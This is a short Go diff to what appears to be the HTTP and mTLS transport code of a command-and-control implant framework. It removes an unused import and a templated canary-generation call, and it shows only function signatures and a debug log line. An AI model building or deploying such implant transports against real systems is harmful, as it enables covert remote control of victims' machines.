@@ -2,7 +2,6 @@ package transports
 
 import (
 	"crypto/x509"
-	"fmt"
 	"io"
 
 	// {{if .HTTPc2Enabled}}
@@ -262,8 +261,6 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 // {{if .HTTPc2Enabled}}
 func httpConnect(uri *url.URL) (*Connection, error) {
-
-	fmt.Sprintf("[[GenerateCanary]]")
 
 	// {{if .Debug}}
 	log.Printf("Connecting -> http(s)://%s", uri.Host)
